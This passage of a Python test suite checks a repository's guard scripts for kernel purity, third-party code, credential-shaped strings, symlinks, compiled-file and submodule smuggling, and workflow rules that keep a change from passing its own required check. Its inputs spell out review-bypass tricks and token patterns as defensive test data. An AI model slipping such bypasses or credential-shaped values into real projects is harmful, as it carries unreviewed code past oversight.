        self.assertEqual(check_purity.run(root), ["x.py:1 holds a value that can change; State is never stored"])
        hidden = {"a default": "def f(key, seen={}):\n    return seen\n",
                  "a class": "class Memo:\n    seen = {}\n",
                  "code at import": "if True:\n    SEEN = {}\n",
                  "a global": "def f():\n    global X\n    X = 1\n"}
        for name, text in hidden.items():
            self.assertTrue(check_purity.run(tree({"kernel/x.py": text})), name)

    def test_an_attribute_assigned_is_caught(self):
        # A module that assigns another's names changes what that module decides from outside it: the gate's
        # severities from derive.py, or a code from terms.py, at import or in a call.
        for text in ("from kernel import gate as _gate\n\n_gate.SECURITY = 'none'\n",
                     "from kernel import terms as t\nt.HELD = 'x'\n",
                     "from kernel import gate\n\n\ndef f():\n    gate.GATING_SEVERITIES = frozenset()\n",
                     "from kernel import terms as t\n\n\ndef f():\n    del t.HELD\n",
                     "from kernel import terms as t\n\n\ndef f():\n    t.HELD, x = 'a', 1\n    return x\n",
                     "def f():\n    f.seen = 1\n"):
            self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": text})), "assigns an attribute"), text)
        self.assertEqual(check_purity.run(tree({"kernel/x.py": "from kernel import terms as t\n\n\ndef f():\n"
                                                "    return t.HELD\n"})), [])

    def test_the_brakes_and_the_gate_stand_apart(self):
        # Each is a protected path alone. The gate imports nothing of the Kernel and the brakes only its codes, so no
        # module that is not protected can change what they decide, and no other module stands in for one of theirs.
        gate = "SECURITY = 'security'\n\n\ndef gates(facts, config):\n    return []\n"
        brakes = "from kernel import terms as t\nfrom kernel.terms import HELD\n\n\ndef paused(_decision, facts):\n" \
                 "    return None\n"
        derive = "from kernel import brakes, gate\nfrom kernel.gate import gates\nimport kernel.gate as gate\n\n\n" \
                 "def derive(facts):\n    pause = brakes.paused(None, facts)\n    return pause or gates(facts, {})\n"
        clean = {"kernel/gate.py": gate, "kernel/brakes.py": brakes, "kernel/derive.py": derive}
        self.assertEqual(check_purity.run(tree(clean)), [])
        # Any binding of a name either owns stands in for theirs, at any depth and in any form, and so does a binding
        # of either module's own name to anything but that module. Each also binds no name of the other's.
        d, g, b = "kernel/derive.py", "kernel/gate.py", "kernel/brakes.py"
        for rel, text, word, owner in (
                (d, "def gates(facts, config):\n    return []\n", "gates", "gate.py"),
                (d, "def f(facts):\n    def gates(a, b):\n        return []\n    return gates(facts, 0)\n", "gates",
                 "gate.py"),
                (d, "SECURITY = 'none'\n", "SECURITY", "gate.py"),
                (d, "def f(facts):\n    gates = facts\n    return gates\n", "gates", "gate.py"),
                (d, "def derive(facts, gates=None):\n    return gates\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return (lambda gates: gates)(xs)\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return [gates for gates in xs]\n", "gates", "gate.py"),
                (d, "def f(xs):\n    for paused in xs:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    with x as paused:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    try:\n        return x\n    except ValueError as gates:\n        return gates\n",
                 "gates", "gate.py"),
                (d, "def f(x):\n    if (gates := x):\n        return gates\n", "gates", "gate.py"),
                (d, "from kernel.terms import NONE as gates\n", "gates", "gate.py"),
                (d, "from kernel.gate import SECURITY as gates\n", "gates", "gate.py"),
                (d, "from kernel.brakes import paused as on_act\nfrom kernel.terms import HELD as paused\n", "paused",
                 "brakes.py"),
                (d, "from kernel import terms as gate\n", "gate", "gate.py"),
                (d, "import kernel.terms as gate\n", "gate", "gate.py"),
                (d, "from kernel import derive as brakes\n", "brakes", "brakes.py"),
                (d, "def brakes(x):\n    return x\n", "brakes", "brakes.py"),
                (b, "from kernel.terms import HELD as gates\n" + brakes, "gates", "gate.py"),
                (b, "from kernel.terms import HELD as paused\n" + brakes, "paused", "brakes.py"),
                (g, gate + "\n\ndef paused(x):\n    return x\n", "paused", "brakes.py"),
                (g, gate + "\n\ndef f(brakes):\n    return brakes\n", "brakes", "brakes.py")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, "binds %s, which %s owns" % (word, owner)), (rel, text, said))
        for rel, text, words in (("kernel/gate.py", "from kernel import terms as t\n" + gate, "imports kernel.terms"),
                                 ("kernel/gate.py", "import kernel.derive\n" + gate, "imports kernel.derive"),
                                 ("kernel/gate.py", "from . import terms\n" + gate, "imports ."),
                                 ("kernel/brakes.py", "from kernel.derive import since_writer\n" + brakes,
                                  "imports kernel.derive"),
                                 ("kernel/brakes.py", "from kernel import terms, decide\n" + brakes,
                                  "imports kernel.decide")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, words), (rel, text, said))

    def test_a_way_round_the_names_is_caught(self):
        root = tree({"kernel/x.py": "def f():\n    return __builtins__['open'], getattr(f, 'x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "uses __builtins__") and caught(problems, "uses getattr"))

    def test_no_kernel_and_a_kernel_that_cannot_be_read_are_problems_not_crashes(self):
        self.assertEqual(check_purity.run(tree({"x": ""})), ["there is no kernel/ to check"])
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "def f(:\n"})), "cannot be read as Python"))
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "async def f():\n    return 1\n"})), "async function"))


class Repo(unittest.TestCase):
    def test_third_party_code_is_caught(self):
        root = tree({"a.py": "import requests\n", "requirements.txt": "requests\n",
                     "tools/vendor/requests/__init__.py": "", "dev-requirements.txt": "x\n", "poetry.lock": ""})
        problems = check_repo.run(root)
        for words in ("imports requests", "requirements.txt: a dependency manifest", "dev-requirements.txt: a dep",
                      "poetry.lock: a dep", "copied in is still third-party"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_repo.run(tree({"docs/prd/requirements.md": "x", "a.py": "from . import b\n"})),
                                "manifest"))

    def test_code_loaded_round_the_import_list_is_caught(self):
        root = tree({"a.py": "s = __import__('socket')\nexec('import requests')\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "uses __import__") and caught(problems, "uses exec"))

    def test_something_shaped_like_a_credential_is_caught(self):
        for name in ("notes.md", "deploy.sh", "x.env", "key.pem"):
            root = tree({name: "token: " + "ghp_" + "a1B2" * 9 + "\n"})
            self.assertTrue(caught(check_repo.run(root), "shaped like a credential"), name)
        shapes = ["github_pat_" + "a1B2" * 9, "glpat-" + "a1B2" * 6, "sk-" + "ant-" + "a1B2" * 6, "AKIA" + "A1B2" * 4,
                  "xoxb" + "-1234567890-abc", "-----BEGIN RSA " + "PRIVATE KEY-----"]
        for shape in shapes:
            self.assertTrue(caught(check_repo.run(tree({"a.py": "X = '%s'\n" % shape})), "credential"), shape[:6])

    def test_a_model_named_by_its_full_id_is_caught_outside_the_documents(self):
        name = "claude-" + "opus-5-5"
        self.assertTrue(caught(check_repo.run(tree({"roles/pr-review/prompt.md": name})), "names a model"))
        self.assertTrue(caught(check_repo.run(tree({"config/x.json": '"gpt-' + '4o-mini"'})), "names a model"))
        self.assertFalse(caught(check_repo.run(tree({"docs/notes.md": name})), "names a model"))

    def test_an_edited_secrets_baseline_is_caught(self):
        whole = (ROOT / ".gitignore").read_text()
        self.assertFalse(caught(check_repo.run(tree({".gitignore": whole})), "baseline"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": whole.replace(".env\n", "", 1)})), "has been edited"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": "__pycache__/\n"})), "does not open with"))

    def test_code_owners_are_the_orgs_word_for_word(self):
        whole = (ROOT / ".github" / "CODEOWNERS").read_text()
        self.assertFalse(caught(check_repo.run(tree({".github/CODEOWNERS": whole})), "CODEOWNERS"))
        mine = whole + "/kernel/ @don-petry\n"
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": mine})), "not the org's file"))
        self.assertTrue(caught(check_repo.run(tree({"x": ""})), "CODEOWNERS is missing"))
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": whole, "CODEOWNERS": whole})),
                               "keep only .github/CODEOWNERS"))

    def test_a_second_definition_is_caught(self):
        root = tree({"a.py": "class T:\n    def test_x(self):\n        pass\n\n    def test_x(self):\n        pass\n",
                     "b.py": "async def f():\n    pass\n\nasync def f():\n    pass\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "a.py:5 defines test_x a second time") and caught(problems, "b.py:4 defines f"))
        prop = "class T:\n    @property\n    def x(self):\n        return 1\n\n    @x.setter\n    def x(self, v):\n        pass\n"
        self.assertFalse(caught(check_repo.run(tree({"a.py": prop})), "a second time"))

    def test_syntax_newer_than_the_oldest_python_is_caught(self):
        root = tree({"a.py": "match 1:\n    case 1:\n        pass\n"})
        self.assertTrue(caught(check_repo.run(root), "is not Python 3.9"))

    def test_a_draw_that_differs_between_python_versions_is_caught(self):
        root = tree({"sim/x.py": "import random\n\ndef f(self):\n    return self.rng.choice([1, 2]), self.rng.random()\n",
                     "sim/y.py": "from random import shuffle\n"})
        problems = check_repo.run(root)
        self.assertEqual(len([p for p in problems if "sim/x.py" in p]), 1)
        self.assertTrue(caught(problems, "calls choice") and caught(problems, "takes a draw from random by name"))

    def test_reaching_into_the_proof_of_concept_is_caught(self):
        root = tree({"a.json": json.dumps({"repo": "combsmith/" + check_repo.FOREIGN})})
        self.assertTrue(caught(check_repo.run(root), "proof-of-concept repo"))

    def test_a_test_where_nothing_will_run_it_is_caught(self):
        root = tree({"tools/test_checks.py": "", "tests/unit/test_new.py": "", "tests/test_ok.py": ""})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "tools/test_checks.py: a test outside tests/"))
        self.assertTrue(caught(problems, "tests/unit/test_new.py: a test below tests/"))
        self.assertFalse(caught(problems, "test_ok.py"))

    def test_a_link_is_refused_wherever_it_is(self):
        # Every check reads the tree through tools/walk.py, which never follows a link. Python
        # imports through one all the same, so a link would carry code past the purity check.
        root = tree({"kernel/x.py": "", "sim/x.py": "", "docs/ext/clock.py": "import time\n",
                     "docs/clock.py": "import time\n"})
        for where in ("kernel", "sim"):
            (root / where / "ext").symlink_to("../docs/ext", target_is_directory=True)
            (root / where / "clock.py").symlink_to("../docs/clock.py")
        (root / "kernel" / "gone.py").symlink_to("nowhere.py")
        self.assertFalse(caught(check_purity.run(root), "ext/clock.py"))      # why: unread, yet importable
        said = sorted(p for p in check_repo.run(root) if ": a link" in p)
        self.assertEqual([p.split(";")[0] for p in said],
                         ["kernel/clock.py: a link to a file", "kernel/ext: a link to a directory",
                          "kernel/gone.py: a link to nothing",
                          "sim/clock.py: a link to a file", "sim/ext: a link to a directory"])
        self.assertTrue(caught(said, "kernel/ext: a link to a directory; Python imports through it, but no check"))
        self.assertTrue(caught(said, "kernel/gone.py: a link to nothing; commit what it points at, or remove it"))


    def test_compiled_code_is_refused_wherever_it_is(self):
        # Python imports kernel/ghost.pyc with no source beside it, and kernel/decide.<tag>.so ahead of
        # kernel/decide.py, yet check_purity reads only .py. No check can read compiled code.
        root = tree({"kernel/decide.py": "", "kernel/ghost.pyc": "", "kernel/decide.cpython-39-darwin.so": "",
                     "sim/x.pyo": "", "tools/x.pyd": "", "docs/x.pyc.md": "", "docs/so": "",
                     "kernel/Spectre.PYC": "", "tools/y.So": ""})
        problems = check_repo.run(root)
        self.assertEqual(sorted(p.split(";")[0] for p in problems if "compiled" in p),
                         ["kernel/Spectre.PYC: compiled code", "kernel/decide.cpython-39-darwin.so: compiled code",
                          "kernel/ghost.pyc: compiled code", "sim/x.pyo: compiled code", "tools/x.pyd: compiled code",
                          "tools/y.So: compiled code"])
        self.assertTrue(caught(problems, "kernel/ghost.pyc: compiled code; Python loads it ahead of, or instead of, "
                                         "the reviewed source, and no check reads it"))

    def test_committed_local_output_is_refused(self):
        # An unchecked-hash kernel/__pycache__/hidden.cpython-39.pyc replaces the reviewed kernel/hidden.py
        # at import, and `git add -f` commits it past .gitignore. What git holds is not local output.
        token = "github_pat_" + "x" * 40 + "\n"
        root = tree({"kernel/hidden.py": "", "kernel/__pycache__/hidden.cpython-39.pyc": "", "corpus/d.jsonl": token,
                     "sim/__pycache__/x.cpython-39.pyc": "", "corpus/local.jsonl": ""})
        commit(root, {"kernel/hidden.py": FILE, "kernel/__pycache__/hidden.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/__pycache__/hidden.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local output, committed",
                      "corpus/d.jsonl: in corpus/, local output make_corpus.py writes, committed",
                      "corpus/d.jsonl: holds something shaped like a credential"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(problems, "sim/__pycache__"))
        self.assertTrue(caught(problems, "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local "
                                         "output, committed; Python loads it ahead of the reviewed source"))
        # A file system that folds case, as macOS's does, finds kernel/__PYCACHE__/ when Python opens
        # kernel/__pycache__/, and runs what is there.
        root = staged({"kernel/hidden.py": "", "kernel/__PYCACHE__/hidden.cpython-314.PYC": "", "Corpus/d.jsonl": ""})
        problems = check_repo.run(root)
        for words in ("kernel/__PYCACHE__/hidden.cpython-314.PYC: compiled code",
                      "kernel/__PYCACHE__/hidden.cpython-314.PYC: in __pycache__/", "Corpus/d.jsonl: in corpus/"):
            self.assertTrue(caught(problems, words), words)
        # What git holds is committed, whatever case the folder it is in was given on disk.
        root = commit(tree({"kernel/__pycache__/x.pyc": ""}), {"kernel/__PYCACHE__/x.pyc": FILE})
        self.assertTrue(caught(check_repo.run(root), "kernel/__pycache__/x.pyc: in __pycache__/"))

    def test_what_git_holds_is_refused_though_gone_from_disk(self):
        # Staged, then deleted from the working tree with the deletion not staged: the walk cannot see
        # it, yet the index still holds it, and the next commit takes it in.
        gone = ["kernel/ghost.pyc", "kernel/__pycache__/y.cpython-39.pyc", "corpus/d.jsonl", "docs/.gitmodules"]
        root = staged(dict({"kernel/x.py": "", "sim/z.PYC": ""}, **{rel: "" for rel in gone}))
        for rel in gone:
            (root / rel).unlink()
        problems = check_repo.run(root)
        for words in ("kernel/ghost.pyc: compiled code", "kernel/__pycache__/y.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/y.cpython-39.pyc: in __pycache__/", "corpus/d.jsonl: in corpus/",
                      "docs/.gitmodules: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(len([p for p in problems if p.startswith("sim/z.PYC: compiled code")]), 1)   # on disk, once

    def test_a_submodule_is_refused(self):
        # A submodule's files come from another repo, at a commit this one's review never sees. Checked
        # out, it holds a .git file, and the walk skips it as another working tree.
        root = tree({".gitmodules": "[submodule \"lib\"]\n\tpath = kernel/lib\n", "kernel/lib/.git": "gitdir: x\n",
                     "kernel/lib/clock.py": "import time\n", "docs/.gitmodules": "", "sim/.GITMODULES": ""})
        commit(root, {".gitmodules": FILE, "kernel/lib": GITLINK, "docs/.gitmodules": FILE, "sim/.GITMODULES": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/lib: a submodule; its files come from another repo",
                      ".gitmodules: declares a submodule", "docs/.gitmodules: declares a submodule",
                      "sim/.GITMODULES: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_purity.run(root), "clock.py"))      # why: unread, yet importable

    def test_an_index_that_cannot_be_read_is_a_problem_and_skips_nothing(self):
        files = {"kernel/x.py": "", "sim/__pycache__/x.cpython-39.pyc": ""}
        whole = git_index({"kernel/x.py": FILE})
        split = whole[:-20] + b"link" + bytes(4)
        for name, data in (("garbage", b"not an index"), ("version 5", whole[:4] + (5).to_bytes(4, "big") + whole[8:]),
                           ("short", whole[:40]), ("checksum", whole[:-1] + b"x"),
                           ("split", split + hashlib.sha1(split, usedforsecurity=False).digest())):
            with self.subTest(index=name):
                root = commit(tree(files), {})
                (root / ".git" / "index").write_bytes(data)
                problems = check_repo.run(root)
                self.assertTrue(caught(problems, "git's index cannot be read"))
                self.assertTrue(caught(problems, "sim/__pycache__/x.cpython-39.pyc: compiled code"))
        root = tree(dict(files, **{".git": "no gitdir here\n"}))
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read"))
        # Broken the ways git never writes: version 4 cutting more from a path than the one before it
        # holds (the first has none before it), and an extension that runs past the end.
        real = staged({"kernel/x.py": "", "kernel/y.py": ""}, "index.version=4")
        whole = (real / ".git" / "index").read_bytes()
        cut = bytearray(whole[:-20])
        cut[12 + 62] = 5
        for data, words in ((checked(bytes(cut)), "a path is cut by more than it holds"),
                            (checked(whole[:-20] + b"ZZZZ" + (99).to_bytes(4, "big")), "it ends early")):
            with self.subTest(words=words):
                (real / ".git" / "index").write_bytes(data)
                self.assertTrue(caught(check_repo.run(real), "git's index cannot be read (%s)" % words))
        # One that cannot be opened is a sentence, not a traceback.
        root = commit(tree(files), {})
        (root / ".git" / "index").unlink()
        (root / ".git" / "index").mkdir()
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read (it cannot be opened"))
        self.assertTrue(caught(check_repo.run(root), "sim/__pycache__/x.cpython-39.pyc: compiled code"))


class Workflows(unittest.TestCase):
    def test_the_example_passes_and_every_rule_has_been_tripped(self):
        self.assertEqual(check_workflows.run(), [])

    def test_a_rule_with_no_counter_example_is_caught(self):
        problems = check_workflows.run(tree({"examples/workflows/verify.yml": GOOD}))
        self.assertEqual(len(problems), len(check_workflows.RULES))

    def test_a_counter_example_must_break_its_rule_and_no_other(self):
        both = GOOD.replace("ubuntu-24.04", "ubuntu-latest").replace("    timeout-minutes: 15\n", "")
        root = clone({"examples/workflows/invalid/runner.two-faults.yml": both,
                      "examples/workflows/invalid/soft.no-fault.yml": GOOD})
        problems = check_workflows.run(root)
        self.assertTrue(caught(problems, "runner.two-faults.yml: must break the rule 'runner' and no other"))
        self.assertTrue(caught(problems, "soft.no-fault.yml: must break the rule 'soft' and no other, and breaks none"))

    def test_an_example_in_the_standard_that_has_drifted_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD,
                     "docs/standards/workflows.md": "```yaml\n" + GOOD.replace("minutes: 15", "minutes: 90") + "```\n"})
        self.assertTrue(caught(check_workflows.run(root), "word for word"))

    def test_the_required_check_that_has_drifted_from_its_example_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD.replace("minutes: 15", "minutes: 45")})
        self.assertTrue(caught(check_workflows.run(root), "change both together"))
        bumped = GOOD.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "a" * 40 + " # v8.0.0")
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": bumped})
        self.assertFalse(caught(check_workflows.run(root), "change both together"))

    def test_a_lens_read_from_a_workflow_that_does_not_run_its_check_is_caught(self):
        # Each required Lens GitHub Actions runs is read only from the workflow file the configuration names for it. A
        # file that is gone, or that runs no job under the Lens's check name, would leave every pull request's check
        # another file's, and the Lens unreadable on all of them.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = defaults["required_lenses"]["deterministic"]
        run_by_actions = [lens for lens in lenses if isinstance(lens["workflow"], str)]
        self.assertTrue(run_by_actions)
        for lens in run_by_actions:
            other = next(x["workflow"] for x in run_by_actions if x["workflow"] != lens["workflow"])
            for path, said in ((".github/workflows/gone.yml", "which does not exist"),
                               (other, "runs no job named %r" % lens["check"])):
                moved = [dict(x, workflow=path) if x is lens else x for x in lenses]
                cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=moved))
                root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
                self.assertTrue(caught(check_workflows.run(root), said), (lens["lens"], path))
            # The job renamed in its own file.
            text = (ROOT / lens["workflow"]).read_text()
            renamed = text.replace("    name: %s\n" % lens["check"], "    name: %s-renamed\n" % lens["check"])
            self.assertNotEqual(renamed, text, lens["lens"])
            root = clone({lens["workflow"]: renamed})
            self.assertTrue(caught(check_workflows.run(root), "runs no job named %r" % lens["check"]), lens["lens"])

    def lens_problems(self, text: str, lens: str = "verify") -> list:
        """The problems check_workflows finds when the Lens `lens` is read from a workflow file holding `text`."""
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = [dict(x, workflow=".github/workflows/lens.yml") if x["lens"] == lens else x
                  for x in defaults["required_lenses"]["deterministic"]]
        cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
        root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n", ".github/workflows/lens.yml": text})
        return [p for p in check_workflows.run(root) if "the Lens %s" % lens in p]

    def test_only_a_jobs_own_name_or_its_id_names_a_lens_check(self):
        # GitHub names a job's check run by the job's own name, or by its id where it has none. A workflow's name, or a
        # step's, names no check run.
        self.assertEqual(self.lens_problems(GOOD), [])
        self.assertEqual(self.lens_problems(GOOD.replace("    name: verify\n", "")), [])
        elsewhere = GOOD.replace("name: factory\n", "name: verify\n").replace("  verify:\n    name: verify\n", "  build:\n")
        elsewhere = elsewhere.replace("      - run: make verify\n", "      - name: verify\n        run: make verify\n")
        self.assertNotEqual(elsewhere, GOOD)
        self.assertTrue(caught(self.lens_problems(elsewhere), "runs no job named 'verify'"))
        renamed = GOOD.replace("  verify:\n    name: verify\n", "  verify:\n    name: build\n")
        self.assertTrue(caught(self.lens_problems(renamed), "runs no job named 'verify'"))

    def test_a_lens_job_that_would_never_report_under_its_name_is_caught(self):
        # A matrix names each of its check runs after the job and its values; a job-level if: can skip the job; a job
        # that calls a reusable workflow reports under the caller's and the callee's names; and a workflow that does not
        # run on both pull_request and merge_group reports on no head, or not in the merge queue. Each leaves the Lens
        # waiting for ever. The one if: allowed is always(), beside needs:, and a job that needs others is skipped when
        # one fails, which passes a required check, unless it runs under always() and judges every other job.
        needs = "    needs:\n      - checks\n      - mutants\n"
        judge = "      - run: python3 -m tools.needs_passed\n"
        given = "    env:\n      NEEDS: ${{ toJSON(needs) }}\n"
        matrix = GOOD.replace("    timeout-minutes: 10\n",
                              "    timeout-minutes: 10\n    strategy:\n      matrix:\n        python:\n          - 3.9\n")
        called = GOOD.split(needs)[0] + "    uses: combsmith/factory/.github/workflows/v.yml@v1-stable\n"
        other_if = "has a job-level if: other than always() beside needs:"
        cases = [(matrix, "has a strategy.matrix"),
                 (GOOD.replace("    if: always()\n", "    if: github.event_name == 'pull_request'\n"), other_if),
                 (GOOD.replace("    if: always()\n", "    if: ${{ always() }}\n"), other_if),
                 (GOOD.replace(needs, ""), other_if),
                 (called, "calls a reusable workflow with uses:"),
                 (GOOD.replace("  merge_group:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("  pull_request:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("    if: always()\n", ""), "it has no job-level if: always()"),
                 (GOOD.replace("      - mutants\n", ""), "it needs checks, not every other job in its file"),
                 (GOOD.replace(needs, "    needs: checks\n"), "it needs checks, not every other job in its file"),
                 (GOOD.replace("      - mutants\n", "      - mutants\n      - deploy\n"), "not every other job in its file"),
                 (GOOD.replace(needs, "    needs: [checks, mutants]\n"), "its needs: cannot be read as a list of jobs"),
                 (GOOD.replace(judge, "      - run: make verify\n"), "it runs no step `python3 -m tools.needs_passed`"),
                 (GOOD.replace(judge, judge + "        if: false\n"), "an if: can skip its step"),
                 (GOOD.replace(given, ""), "it does not give NEEDS"),
                 (GOOD.replace("toJSON(needs)", "toJSON(needs.checks)"), "it does not give NEEDS"),
                 (GOOD.replace(judge, judge + "        env:\n          NEEDS: '{}'\n"), "it does not give NEEDS"),
                 (GOOD.replace(needs, "").replace("    if: always()\n", "").replace(given, "")
                  .replace(judge, "      - run: make verify\n"), "it has no needs:, so the other jobs in its file"),
                 (GOOD.split("  checks:\n")[0] + "  verify:\n" + GOOD.split("  verify:\n")[1],
                  "it needs checks, mutants, not every other job in its file, none"),
                 (GOOD.replace(judge, "      - run: |\n          make fast\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, "      - run: >\n          python3 -m tools.verify\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, judge + "      - run: make verify\n"), "its steps are more than a checkout"),
                 (GOOD.replace(judge, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n" + judge),
                  "its steps are more than a checkout")]
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        # The list of what it needs may stand at the indent of its key, as YAML allows.
        level = GOOD.replace(needs, "    needs:\n    - mutants\n    - checks\n")
        spaced = GOOD.replace(needs, "    needs:\n      - checks\n\n      # the shards\n      - mutants\n")
        for text in (level, spaced):
            self.assertNotEqual(text, GOOD)
            self.assertEqual(self.lens_problems(text), [])

    def test_a_lens_job_that_judges_its_needs_runs_from_the_base(self):
        # verify's verdict is the base's tools/needs_passed.py: its one checkout is of the base, on a pull request and in
        # the merge queue, and of nothing else, so a change cannot make its own verdict pass (decision 0023).
        ref = "          ref: %s\n" % check_workflows.BASE
        self.assertIn(ref, GOOD)
        said = "its one checkout is not of the base alone"
        head = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n        with:\n          persist-credentials: false\n"
        mine = ("    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
                "        with:\n          persist-credentials: false\n" + ref)
        self.assertEqual(GOOD.count(mine), 1)
        cases = [GOOD.replace(ref, ""),
                 GOOD.replace(ref, "          ref: ${{ github.event.pull_request.base.sha }}\n"),
                 GOOD.replace(ref, "          ref: ${{ github.event.merge_group.base_sha }}\n"),
                 GOOD.replace(ref, ref.replace(" }}", " || github.sha }}")),
                 GOOD.replace(ref, ref.replace(" }}", " || github.event.pull_request.head.sha }}")),
                 GOOD.replace(ref, "          ref: main\n"),
                 GOOD.replace(ref, ref + "          path: base\n"),
                 GOOD.replace(ref, ref + "          repository: someone/else\n"),
                 GOOD.replace(ref, ref + "          fetch-depth: 0\n"),
                 GOOD.replace("      - run: python3 -m tools.needs_passed\n", head + "      - run: python3 -m tools.needs_passed\n"),
                 GOOD.replace(mine, "    steps:\n" + head.replace("false\n", "false\n          path: head\n")
                              + mine[len("    steps:\n"):]),
                 GOOD.replace(mine, "    steps:\n")]
        for text in cases:
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), said), text)
        self.assertFalse(caught(self.lens_problems(GOOD), said))
        # On any other event there is no base: `ref:` would come out empty, and the checkout would be the head's.
        empty = "where there is no base to check out"
        for event in ("  push:\n", "  workflow_dispatch:\n", "  schedule:\n    - cron: '17 3 * * *'\n"):
            text = GOOD.replace("  merge_group:\n", "  merge_group:\n" + event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), empty), event)
        for event in ("push", "workflow_dispatch"):
            text = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on: %s\n" % event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), "its workflow runs on %s, where there is no base" % event),
                            event)
        self.assertFalse(caught(self.lens_problems(GOOD), empty))

    def test_the_required_check_fails_unless_every_job_it_needs_passed(self):
        # `verify` runs under always(), so it reports whatever the jobs it needs did, and only every one's success
        # passes it. Needs it cannot read, or that name no job, fail it too.
        passed = {"checks": {"result": "success", "outputs": {}}, "mutants": {"result": "success", "outputs": {}}}
        self.assertEqual(needs_passed.problems(json.dumps(passed)), [])
        for result in ("failure", "cancelled", "skipped", "Success", None, True):
            said = needs_passed.problems(json.dumps(dict(passed, mutants={"result": result, "outputs": {}})))
            self.assertTrue(caught(said, "the job mutants ended"), result)
        self.assertTrue(caught(needs_passed.problems(json.dumps({"checks": "success"})), "the job checks ended"))
        for text in (None, "", "{", "null", "[]", '"success"'):
            self.assertTrue(caught(needs_passed.problems(text), "cannot be read") or
                            caught(needs_passed.problems(text), "names no job"), text)
        self.assertTrue(caught(needs_passed.problems("{}"), "names no job"))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(needs_passed.main({"NEEDS": json.dumps(passed)}), 0)
            self.assertEqual(needs_passed.main({"NEEDS": "{}"}), 1)
            self.assertEqual(needs_passed.main({}), 1)

    def test_a_lens_run_by_actions_names_its_workflow_and_no_other_does(self):
        # GitHub Actions reports every job in the repo, so a Lens it runs must name its file; no other App runs one.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        for lens in defaults["required_lenses"]["deterministic"]:
            if lens["app_id"] == check_workflows.ACTIONS_APP:
                changed, said = dict(lens, workflow=None), "is run by GitHub Actions and names no workflow file"
            else:
                changed, said = dict(lens, workflow=".github/workflows/verify.yml"), "only GitHub Actions runs one"
            lenses = [changed if x is lens else x for x in defaults["required_lenses"]["deterministic"]]
            cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
            root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
            self.assertTrue(caught(check_workflows.run(root), said), lens["lens"])

    def test_an_unreadable_lens_table_is_a_problem_and_the_check_goes_on(self):
        # A check collects every problem: a broken config/defaults.json is reported, and the workflows are still read.
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        for text, said in (("{", "cannot be read"), ("{}", "cannot be read"),
                           ('{"required_lenses": {"deterministic": [1]}}', "is not a list of Lenses"),
                           ('{"required_lenses": {"deterministic": [{"lens": "verify", "app_id": 15368, '
                            '"workflow": ".github/workflows/verify.yml"}]}}', "names no check")):
            problems = check_workflows.run(tree({"config/defaults.json": text, ".github/workflows/verify.yml": GOOD,
                                                 ".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
            self.assertTrue(caught(problems, said), text)
